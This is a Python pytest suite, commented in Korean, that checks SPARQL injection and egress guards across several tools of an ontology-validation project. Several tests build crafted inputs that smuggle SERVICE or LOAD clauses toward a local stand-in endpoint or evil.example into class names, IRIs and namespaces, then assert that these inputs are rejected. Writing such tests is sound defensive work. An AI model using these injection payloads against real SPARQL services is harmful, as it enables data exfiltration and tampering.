"""SPARQL 실행 지점별 입력 검증과 최종 문자열 egress 가드 회귀 테스트.

대상 실행 지점:

- ``validate_competency_questions``: CQ domains, T-Box edge, 딕셔너리 OP/DP 이름을
  보간하기 전에 로컬 이름 형식을 확인하고, 실행 직전 최종 문자열을 가드한다.
- ``run_entailment_regression``: golden ASK 질의를 실행 전에 가드하고, 공개 경로
  인자를 허용 디렉터리 안으로 제한한다.
- mutation runner: WHERE 기반 SELECT 와 바인딩을 끝낸 UPDATE 를 가드하고, 그래프에서
  고른 IRI 는 IRIREF 형식일 때만 바인딩한다.
- ``verify_roundtrip_fidelity``: 클래스 이름을 로컬 이름으로 확인하고 설정된 도메인
  prefix 로 질의한다.
- ``SharedCheckContext.instance_types``: 감지한 네임스페이스를 문자열 리터럴로
  이스케이프하고 최종 문자열을 가드한다.

네트워크에는 접속하지 않는다. 그래프는 메모리 store 를 쓰고, rdflib SERVICE 평가의
원격 요청 함수는 호출을 기록한 뒤 실패하도록 대체한다. 질의에 쓰는 원격 주소는
``http://127.0.0.1:65530/`` 하나뿐이다.

프로세스 전역 SERVICE 차단점과 별개로 각 실행 지점의 가드를 확인하기 위해, 거부
경로에서는 그래프에 질의 문자열이 넘어가지 않았는지 (기록 그래프가 비었는지) 를 본다.
"""

from __future__ import annotations

import json

import pytest
from rdflib import OWL, RDF, Graph, Literal, URIRef

from domain.namespaces import DOMAIN_NS, NS_PREFIX, SPARQL_PREFIXES

_REMOTE = "http://127.0.0.1:65530/sparql"


@pytest.fixture
def outbound_calls(monkeypatch):
    """rdflib SERVICE 평가가 원격 요청을 시도하면 기록하고 실패시킨다."""
    import rdflib.plugins.sparql.evaluate as evaluate

    calls: list[object] = []

    def _refuse(*args, **_kwargs):
        calls.append(args[0] if args else None)
        raise AssertionError("로컬 SPARQL 이 원격 요청을 시도함")

    monkeypatch.setattr(evaluate, "urlopen", _refuse)
    return calls


class _RecordingGraph:
    """실행된 질의 문자열을 기록하고 메모리 그래프에 위임한다."""

    def __init__(self, graph: Graph):
        self._graph = graph
        self.queries: list[str] = []

    def query(self, query, *args, **kwargs):
        self.queries.append(query)
        return self._graph.query(query, *args, **kwargs)

    def __len__(self):
        return len(self._graph)


def _domain_graph() -> Graph:
    """도메인 클래스 인스턴스 하나를 가진 메모리 그래프."""
    g = Graph()
    g.add((URIRef("urn:inst:EQ-LOCAL-42"), RDF.type, URIRef(f"{DOMAIN_NS}EquipmentMaster")))
    return g


# ── validate_competency_questions ─────────────────────────────────


def _cq_env(tmp_path, monkeypatch, cqs: list[dict], graph) -> None:
    """CQ 파일, 딕셔너리, T-Box 경로를 tmp_path 로 돌리고 그래프를 주입한다."""
    from tools import competency_questions as module

    cq_path = tmp_path / "competency_questions.json"
    cq_path.write_text(json.dumps(cqs, ensure_ascii=False), encoding="utf-8")
    monkeypatch.setattr(module, "_CQ_PATH", str(cq_path))
    monkeypatch.setattr(module, "SEMANTIC_DICT_PATH", str(tmp_path / "no_dict.json"))
    monkeypatch.setattr(module, "TBOX_PATH", str(tmp_path / "no_tbox.ttl"))
    monkeypatch.setattr("tools.sparql_local._get_graph", lambda _source: (graph, "test"))


def test_validate_cq_excludes_domain_that_is_not_a_local_name(
    tmp_path, monkeypatch, outbound_calls,
):
    from tools.competency_questions import validate_competency_questions

    payload = f"EquipmentMaster . SERVICE <{_REMOTE}> {{ ?x ?b ?c }}"
    recording = _RecordingGraph(_domain_graph())
    _cq_env(tmp_path, monkeypatch, [
        {"id": "CQ01", "question_ko": "설비 목록", "domains": [payload]},
    ], recording)

    result = json.loads(validate_competency_questions())

    assert result["success"] is True
    assert outbound_calls == []
    assert not any("SERVICE" in q for q in recording.queries)
    row = result["results"][0]
    assert row["status"] == "NOT_ANSWERABLE"
    assert any(
        "로컬 이름" in (check.get("error") or "") for check in row["failed_checks"]
    )


def test_validate_cq_guards_final_query_string(tmp_path, monkeypatch, outbound_calls):
    from tools import competency_questions as module

    recording = _RecordingGraph(_domain_graph())
    _cq_env(tmp_path, monkeypatch, [
        {"id": "CQ01", "question_ko": "설비 목록", "domains": ["EquipmentMaster"]},
    ], recording)
    egress_sparql = (
        f"SELECT (COUNT(?x) AS ?cnt) WHERE {{ ?x a {NS_PREFIX}:EquipmentMaster . "
        f"SERVICE <{_REMOTE}> {{ ?x ?b ?c }} }}"
    )
    monkeypatch.setattr(module, "_build_connectivity_queries", lambda *_a, **_k: [{
        "type": "instance_check",
        "class": "EquipmentMaster",
        "sparql": egress_sparql,
        "description": "EquipmentMaster 인스턴스 존재 확인",
    }])

    result = json.loads(module.validate_competency_questions())

    assert outbound_calls == []
    assert recording.queries == []
    failed = result["results"][0]["failed_checks"]
    assert failed and "SERVICE" in failed[0]["error"]


def test_validate_cq_valid_domain_still_counts_instances(
    tmp_path, monkeypatch, outbound_calls,
):
    from tools.competency_questions import validate_competency_questions

    recording = _RecordingGraph(_domain_graph())
    _cq_env(tmp_path, monkeypatch, [
        {"id": "CQ01", "question_ko": "설비 목록", "domains": ["EquipmentMaster"]},
    ], recording)

    result = json.loads(validate_competency_questions())

    assert outbound_calls == []
    row = result["results"][0]
    assert row["status"] == "ANSWERABLE"
    assert row["checks_total"] == 1
    assert len(recording.queries) == 1


def test_connectivity_queries_exclude_invalid_dictionary_names():
    from tools.competency_questions import _build_connectivity_queries

    bad_op = f"hasStatus }} SERVICE <{_REMOTE}> {{ ?x ?p ?o"
    bad_dp = f"statusValue }} SERVICE <{_REMOTE}> {{ ?x ?p ?o"
    obj_props = {bad_op: {"domain": "EquipmentMaster", "range": "EquipmentStatus"}}
    sem_dict = {"classes": {"EquipmentMaster": {
        "datatype_properties": ["equipmentName", bad_dp],
    }}}
    cq = {"domains": ["EquipmentMaster", "EquipmentStatus"]}

    queries = _build_connectivity_queries(cq, obj_props, sem_dict, tbox=None)

    executable = [q for q in queries if q.get("sparql")]
    assert executable
    assert not any("SERVICE" in q["sparql"] for q in executable)
    invalid = [q for q in queries if q["type"] == "invalid_name"]
    assert any(bad_op[:20] in q["error"] for q in invalid)
    assert any(bad_dp[:20] in q["error"] for q in invalid)
    value_checks = [q for q in queries if q["type"] == "value_check"]
    assert value_checks and value_checks[0]["properties"] == ["equipmentName"]


@pytest.mark.parametrize("hops", [1, 2])
def test_connectivity_queries_exclude_invalid_tbox_edge(monkeypatch, hops):
    from tools import competency_questions as module

    bad_edge = f"http://example.org/x#rel . SERVICE <{_REMOTE}> {{ ?x ?p ?o }}"
    path = ["http://example.org/x#EquipmentMaster"]
    if hops == 2:
        path.append("http://example.org/x#Mid")
    path.append("http://example.org/x#EquipmentStatus")
    monkeypatch.setattr(module, "_find_connecting_path", lambda *_a, **_k: {
        "hops": hops, "path": path, "edges": [bad_edge] * hops,
    })

    queries = module._build_connectivity_queries(
        {"domains": ["EquipmentMaster", "EquipmentStatus"]}, {}, {}, tbox=Graph(),
    )

    assert not any("SERVICE" in (q.get("sparql") or "") for q in queries)
    assert any(q["type"] == "invalid_name" for q in queries)


# ── run_entailment_regression ─────────────────────────────────────


def test_golden_ask_with_service_is_not_executed(outbound_calls):
    from tools.entailment_regression import _run_golden_set

    g = Graph()
    g.add((URIRef("urn:x:secret"), URIRef("urn:p"), Literal("LOCAL-SECRET-VALUE")))
    recording = _RecordingGraph(g)
    golden = {
        "positive": [{
            "id": "p1", "description": "",
            "query": f"ASK {{ ?s <urn:p> ?v . SERVICE <{_REMOTE}> {{ BIND(?v AS ?w) }} }}",
        }],
        "negative": [{
            "id": "n1", "description": "",
            "query": f"ASK {{ ?s <urn:p> ?v . SERVICE <{_REMOTE}> {{ BIND(?v AS ?w) }} }}",
        }],
    }

    report = _run_golden_set(recording, golden)

    assert outbound_calls == []
    assert recording.queries == []
    assert report["pass_rate"] == 0.0
    assert {f["id"] for f in report["failures"]} == {"p1", "n1"}
    assert all("SERVICE" in f["error"] for f in report["failures"])


def _entailment_files(tmp_path):
    """허용 디렉터리 역할을 할 두 디렉터리에 추론 TTL 과 golden JSON 을 둔다."""
    generated = tmp_path / "generated"
    rules = tmp_path / "rules"
    generated.mkdir()
    rules.mkdir()
    inferred = generated / "inferred.ttl"
    inferred.write_text("<urn:a> <urn:p> <urn:b> .\n", encoding="utf-8")
    golden = rules / "golden.json"
    golden.write_text(json.dumps({
        "positive": [{"id": "p1", "description": "", "query": "ASK { <urn:a> <urn:p> <urn:b> }"}],
        "negative": [],
    }), encoding="utf-8")
    return generated, rules, inferred, golden


def test_entailment_rejects_inferred_path_outside_generated(tmp_path, monkeypatch):
    from tools import entailment_regression as module

    generated, rules, inferred, golden = _entailment_files(tmp_path)
    outside = tmp_path / "outside.ttl"
    outside.write_text(inferred.read_text(encoding="utf-8"), encoding="utf-8")
    monkeypatch.setattr(module, "GENERATED_DIR", str(generated), raising=False)
    monkeypatch.setattr(module, "_RULES_DIR", str(rules))

    result = json.loads(module.run_entailment_regression(
        inferred_path=str(outside), golden_path=str(golden),
    ))

    assert result["success"] is False
    assert "inferred_path" in result["error"]


def test_entailment_rejects_golden_path_outside_rules(tmp_path, monkeypatch):
    from tools import entailment_regression as module

    generated, rules, inferred, golden = _entailment_files(tmp_path)
    outside = tmp_path / "golden_outside.json"
    outside.write_text(golden.read_text(encoding="utf-8"), encoding="utf-8")
    monkeypatch.setattr(module, "GENERATED_DIR", str(generated), raising=False)
    monkeypatch.setattr(module, "_RULES_DIR", str(rules))

    result = json.loads(module.run_entailment_regression(
        inferred_path=str(inferred), golden_path=str(outside),
    ))

    assert result["success"] is False
    assert "golden_path" in result["error"]


def test_entailment_accepts_paths_inside_allowed_dirs(tmp_path, monkeypatch):
    from tools import entailment_regression as module

    generated, rules, inferred, golden = _entailment_files(tmp_path)
    monkeypatch.setattr(module, "GENERATED_DIR", str(generated), raising=False)
    monkeypatch.setattr(module, "_RULES_DIR", str(rules))

    result = json.loads(module.run_entailment_regression(
        inferred_path=str(inferred), golden_path=str(golden),
    ))

    assert result["success"] is True
    assert result["pass_rate"] == 1.0
    assert result["positive_pass"] == 1


# ── mutation runner ───────────────────────────────────────────────


def _tbox_with_inverse() -> Graph:
    g = Graph()
    g.add((URIRef("urn:t:p"), RDF.type, OWL.ObjectProperty))
    g.add((URIRef("urn:t:q"), RDF.type, OWL.ObjectProperty))
    g.add((URIRef("urn:t:p"), OWL.inverseOf, URIRef("urn:t:q")))
    return g


_EGRESS_MUTATOR = (
    "PREFIX owl: <http://www.w3.org/2002/07/owl#>\n"
    "DELETE { ?TARGET_PROP owl:inverseOf ?inv . }\n"
    "WHERE  { ?TARGET_PROP owl:inverseOf ?inv .\n"
    f"         SERVICE <{_REMOTE}> {{ ?inv ?p ?o }} }}\n"
)


def test_mutator_with_service_is_rejected_before_execution(outbound_calls):
    from tools.mutation_runner import Mutator, apply_mutator

    graph = _tbox_with_inverse()
    mutator = Mutator(
        name="M2_inverse/egress", category="M2", path="<test>", sparql=_EGRESS_MUTATOR,
    )

    mutated, info = apply_mutator(graph, mutator)

    assert outbound_calls == []
    assert info["applied"] is False
    assert info["reason"] == "sparql_guard_rejected"
    assert mutated is graph
    assert len(graph) == 3


def test_where_select_with_service_is_not_executed(outbound_calls):
    from tools.mutation_runner import _targets_from_where

    recording = _RecordingGraph(_tbox_with_inverse())

    binding = _targets_from_where(recording, _EGRESS_MUTATOR, ["TARGET_PROP"])

    assert outbound_calls == []
    assert recording.queries == []
    assert binding is None


_BAD_IRI = f"urn:t:p> owl:inverseOf ?inv . }} ; LOAD <{_REMOTE}> ; DELETE {{ <urn:t:x"


def test_bind_and_update_rejects_iri_outside_iriref(monkeypatch):
    from tools import mutation_runner as module

    executed: list[str] = []

    def _record_update(self, update_object, *args, **kwargs):
        executed.append(str(update_object))
        raise AssertionError("검증되지 않은 UPDATE 가 실행됨")

    monkeypatch.setattr(Graph, "update", _record_update)
    sparql = (
        "PREFIX owl: <http://www.w3.org/2002/07/owl#>\n"
        "DELETE { ?TARGET_PROP owl:inverseOf ?inv . }\n"
        "WHERE  { ?TARGET_PROP owl:inverseOf ?inv . }\n"
    )

    with pytest.raises(ValueError):
        module._bind_and_update(
            _tbox_with_inverse(), sparql, {"?TARGET_PROP": URIRef(_BAD_IRI)},
        )
    assert executed == []


def test_resolve_targets_skips_iri_outside_iriref():
    from tools.mutation_runner import resolve_targets

    graph = _tbox_with_inverse()
    graph.add((URIRef(_BAD_IRI), RDF.type, OWL.ObjectProperty))

    targets = resolve_targets(graph, "?TARGET_PROP", limit=10)

    assert URIRef(_BAD_IRI) not in targets
    assert targets == [URIRef("urn:t:p"), URIRef("urn:t:q")]


def test_catalog_style_mutator_still_applies():
    from tools.mutation_runner import Mutator, apply_mutator

    sparql = (
        "PREFIX owl: <http://www.w3.org/2002/07/owl#>\n"
        "DELETE { ?TARGET_PROP owl:inverseOf ?inv . }\n"
        "WHERE  { ?TARGET_PROP owl:inverseOf ?inv . }\n"
    )
    mutator = Mutator(name="M2_inverse/delete_inverse", category="M2",
                      path="<test>", sparql=sparql)

    mutated, info = apply_mutator(_tbox_with_inverse(), mutator)

    assert info["applied"] is True
    assert info["triples_removed"] == 1
    assert (URIRef("urn:t:p"), OWL.inverseOf, URIRef("urn:t:q")) not in mutated


# ── verify_roundtrip_fidelity ─────────────────────────────────────


def test_roundtrip_skips_class_name_that_is_not_a_local_name(tmp_path, outbound_calls):
    from tools.roundtrip import _reconstruct_class_rows, roundtrip_class

    bad = f"Item . SERVICE <{_REMOTE}> {{ ?s ?p ?o }}"
    recording = _RecordingGraph(_domain_graph())
    csv_path = tmp_path / "items.csv"
    csv_path.write_text("itemId,itemName\nI001,Widget\n", encoding="utf-8")

    result = roundtrip_class(recording, str(csv_path), bad, limit=10)

    assert "skipped" in result
    assert recording.queries == []
    with pytest.raises(ValueError):
        _reconstruct_class_rows(recording, bad)
    assert recording.queries == []
    assert outbound_calls == []


def test_roundtrip_uses_configured_domain_prefix(monkeypatch):
    from tools import roundtrip as module

    g = Graph()
    cls = URIRef(f"{DOMAIN_NS}Item")
    inst = URIRef("urn:inst:Item_001")
    g.add((inst, RDF.type, cls))
    g.add((inst, URIRef(f"{DOMAIN_NS}itemId"), Literal("I001")))
    monkeypatch.setattr(module, "NS_PREFIX", "semi", raising=False)
    monkeypatch.setattr(
        module, "prepend_prefixes", lambda q: f"PREFIX semi: <{DOMAIN_NS}>\n{q}",
    )

    rows = module._reconstruct_class_rows(g, "Item")

    assert rows == [{"itemId": "I001"}]


def test_roundtrip_guards_final_query_string(monkeypatch, outbound_calls):
    from tools import roundtrip as module

    g = Graph()
    inst = URIRef("urn:inst:Item_001")
    g.add((inst, RDF.type, URIRef(f"{DOMAIN_NS}Item")))
    g.add((inst, URIRef(f"{DOMAIN_NS}itemId"), Literal("I001")))
    monkeypatch.setattr(
        module, "prepend_prefixes",
        lambda q: SPARQL_PREFIXES + q.replace(
            "FILTER(isLiteral(?o))",
            f"SERVICE <{_REMOTE}> {{ ?s ?p ?o }} FILTER(isLiteral(?o))",
        ),
    )

    with pytest.raises(ValueError, match="SERVICE"):
        module._reconstruct_class_rows(g, "Item")
    assert outbound_calls == []


# ── SharedCheckContext.instance_types ─────────────────────────────


def test_instance_types_keeps_namespace_inside_string_literal(outbound_calls):
    from tools.validation_support.common import SharedCheckContext

    crafted_ns = (
        f'http://evil.example/")) SERVICE <{_REMOTE}> {{ ?s ?p ?x }} '
        'FILTER(STRSTARTS(STR(?o), "http://evil.example/'
    )
    tbox = Graph()
    tbox.add((URIRef(crafted_ns + "Cls"), RDF.type, OWL.Class))
    g = Graph()
    g.add((URIRef("urn:s:1"), RDF.type, URIRef("urn:o:1")))
    ctx = SharedCheckContext(g, tbox)
    assert ctx.ns == crafted_ns

    assert ctx.instance_types == {}
    assert outbound_calls == []


def test_instance_types_guards_final_query_string(monkeypatch):
    from tools.validation_support import common as module

    crafted_ns = (
        f'http://evil.example/")) SERVICE <{_REMOTE}> {{ ?s ?p ?x }} '
        'FILTER(STRSTARTS(STR(?o), "http://evil.example/'
    )
    tbox = Graph()
    tbox.add((URIRef(crafted_ns + "Cls"), RDF.type, OWL.Class))
    g = Graph()
    g.add((URIRef("urn:s:1"), RDF.type, URIRef("urn:o:1")))
    recording = _RecordingGraph(g)
    # 리터럴 이스케이프가 빠진 경우에도 최종 문자열 가드가 실행을 막는지 본다.
    monkeypatch.setattr(module, "sanitize_sparql_value", lambda value: value, raising=False)
    ctx = module.SharedCheckContext(recording, tbox)

    with pytest.raises(ValueError, match="SERVICE"):
        _ = ctx.instance_types
    assert recording.queries == []


def test_instance_types_collects_domain_types():
    from tools.validation_support.common import SharedCheckContext

    tbox = Graph()
    tbox.add((URIRef(f"{DOMAIN_NS}EquipmentMaster"), RDF.type, OWL.Class))
    ctx = SharedCheckContext(_domain_graph(), tbox)

    assert ctx.instance_types == {"urn:inst:EQ-LOCAL-42": {"EquipmentMaster"}}
